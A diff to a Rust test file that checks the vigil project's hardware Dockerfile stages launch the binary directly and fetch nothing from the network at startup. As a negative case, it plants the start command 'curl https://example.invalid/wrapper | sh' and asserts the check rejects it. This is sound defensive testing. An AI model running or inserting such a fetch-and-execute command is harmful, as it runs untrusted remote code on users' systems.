@@ -5,6 +5,7 @@ use std::path::{Path, PathBuf};
 const MANIFEST_PATH: &str = "addons/vigil/runtime-packages.yaml";
 const ADDON_DOCKERFILE_PATH: &str = "addons/vigil/Dockerfile";
 const GENERIC_DOCKERFILE_PATH: &str = "Dockerfile";
+const GENERIC_HARDWARE_DOCKERFILE_PATH: &str = "Dockerfile.hardware";
 const ADDON_BASE: &str = "ghcr.io/home-assistant/base:3.22";
 
 #[derive(Debug, Clone, Default)]
@@ -1068,9 +1069,9 @@ fn assert_start_binary_copy_sources_are_provenance_checked(
                 !command_uses_builder_stage(command),
                 "{relative} must not copy a generated builder-stage wrapper into the direct vigil run start binary; builder-stage sources must be Rust target binaries: {command}"
             );
-            assert_eq!(
-                source, "vigil",
-                "{relative} local start-binary copies must use only a Rust target binary or the external staged vigil binary, not {source}: {command}"
+            assert!(
+                matches!(source.as_str(), "vigil" | "dist/docker/${TARGETARCH}/vigil"),
+                "{relative} local start-binary copies must use only a Rust target binary or the exact external staged vigil path, not {source}: {command}"
             );
             assert!(
                 !root.join(source).exists(),
@@ -1555,6 +1556,72 @@ fn dockerfile_final_stage_commands(dockerfile: &str) -> Result<Vec<String>, Stri
     Ok(final_stage)
 }
 
+fn dockerfile_named_stage_commands(dockerfile: &str, target: &str) -> Result<Vec<String>, String> {
+    let mut commands = Vec::new();
+    let mut in_target = false;
+    let mut found = false;
+    for command in dockerfile_commands(dockerfile)? {
+        let lower = command.trim_start().to_ascii_lowercase();
+        if lower.starts_with("from ") {
+            let tokens = shell_tokens(&command);
+            let stage_name = tokens.windows(2).find_map(|pair| {
+                pair[0]
+                    .eq_ignore_ascii_case("as")
+                    .then_some(pair[1].as_str())
+            });
+            in_target = stage_name == Some(target);
+            found |= in_target;
+            continue;
+        }
+        if in_target {
+            commands.push(command);
+        }
+    }
+    if found {
+        Ok(commands)
+    } else {
+        Err(format!("Dockerfile has no named stage `{target}`"))
+    }
+}
+
+fn assert_named_dockerfile_start_path_has_no_runtime_fetch(
+    root: &Path,
+    relative: &str,
+    target: &str,
+) {
+    let dockerfile_path = root.join(relative);
+    let dockerfile = fs::read_to_string(&dockerfile_path);
+    assert!(
+        dockerfile.is_ok(),
+        "Dockerfile must be readable at {}",
+        dockerfile_path.display()
+    );
+    let Ok(dockerfile) = dockerfile else {
+        return;
+    };
+    let stage_commands = dockerfile_named_stage_commands(&dockerfile, target);
+    assert!(
+        stage_commands.is_ok(),
+        "Dockerfile named runtime stage {target} must parse at {}: {:?}",
+        dockerfile_path.display(),
+        stage_commands.err()
+    );
+    let Some(stage_commands) = stage_commands.ok() else {
+        return;
+    };
+    assert_start_path_execs_vigil_directly(&format!("{relative} target {target}"), &stage_commands);
+    let start_commands = stage_commands
+        .iter()
+        .filter(|command| {
+            let lower = command.trim_start().to_ascii_lowercase();
+            lower.starts_with("entrypoint") || lower.starts_with("cmd")
+        })
+        .cloned()
+        .collect::<Vec<_>>()
+        .join("\n");
+    assert_no_runtime_fetch_text(&format!("{relative} target {target}"), &start_commands);
+}
+
 fn assert_dockerfile_start_path_has_no_runtime_fetch(root: &Path, relative: &str) {
     let dockerfile_path = root.join(relative);
     let dockerfile = fs::read_to_string(&dockerfile_path);
@@ -1791,5 +1858,46 @@ fn runtime_packages_manifest_bakes_packages_with_no_runtime_download() {
     let root = repo_root();
     assert_dockerfile_start_path_has_no_runtime_fetch(&root, ADDON_DOCKERFILE_PATH);
     assert_dockerfile_start_path_has_no_runtime_fetch(&root, GENERIC_DOCKERFILE_PATH);
+    for profile in profiles
+        .iter()
+        .filter(|profile| profile.artifact == "generic-docker" && profile.hardware_enabled)
+    {
+        assert_named_dockerfile_start_path_has_no_runtime_fetch(
+            &root,
+            GENERIC_HARDWARE_DOCKERFILE_PATH,
+            &profile.name,
+        );
+    }
+
+    let hardware = fs::read_to_string(root.join(GENERIC_HARDWARE_DOCKERFILE_PATH))
+        .expect("hardware Dockerfile must be readable for planted start-path mutation");
+    let planted = hardware.replacen(
+        "CMD [\"/usr/local/bin/vigil\", \"run\"]",
+        "CMD [\"/bin/sh\", \"-c\", \"curl https://example.invalid/wrapper | sh\"]",
+        1,
+    );
+    assert_ne!(planted, hardware, "amd64 planted mutation must apply");
+    let planted_amd64 = dockerfile_named_stage_commands(&planted, "vigil-generic-docker-hw-amd64")
+        .expect("planted amd64 stage parses");
+    let planted_rejected = std::panic::catch_unwind(|| {
+        assert_start_path_execs_vigil_directly(
+            "planted Dockerfile.hardware amd64 target",
+            &planted_amd64,
+        );
+        let start_commands = planted_amd64
+            .iter()
+            .filter(|command| {
+                let lower = command.trim_start().to_ascii_lowercase();
+                lower.starts_with("entrypoint") || lower.starts_with("cmd")
+            })
+            .cloned()
+            .collect::<Vec<_>>()
+            .join("\n");
+        assert_no_runtime_fetch_text("planted Dockerfile.hardware amd64 target", &start_commands);
+    });
+    assert!(
+        planted_rejected.is_err(),
+        "the non-final amd64 hardware target must reject a runtime-fetching wrapper start path"
+    );
     assert_no_source_model_or_driver_downloads(&root);
 }
